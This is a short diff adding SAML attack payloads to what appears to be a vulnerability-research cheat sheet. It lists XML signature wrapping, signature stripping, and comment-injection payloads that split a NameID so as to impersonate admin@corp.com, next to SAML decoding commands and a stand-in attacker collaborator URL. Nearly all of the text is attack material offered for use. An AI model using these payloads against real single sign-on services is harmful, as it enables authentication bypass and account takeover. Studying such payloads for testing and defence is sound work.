@@ -33,3 +33,12 @@ Conditions/NotOnOrAfter
 base64 -d <<< "$SAML" | xmllint --format - > saml.xml
 cat saml.xml | base64 -w0
 http://collaborator.attacker.com/x
+# ─── SAML attack payloads (skraft9/vulnerability-research) ───
+# XSW1: clone Assertion, place attacker version above the signed one
+<Response><Assertion ID="attacker">... attacker claims ...</Assertion><Assertion ID="original">... signed ...</Assertion></Response>
+# Signature stripping (lax SPs accept unsigned):
+<Response><!-- <ds:Signature>...</ds:Signature> --><Assertion>... modified ...</Assertion></Response>
+# XML-comment injection to split NameID (DB lookup sees pre-comment, sig sees post):
+<NameID>admin@corp.com<!--x-->.evil.com</NameID>
+# Comment inside AttributeValue:
+<AttributeValue>admin<!--x-->@evil.com</AttributeValue>
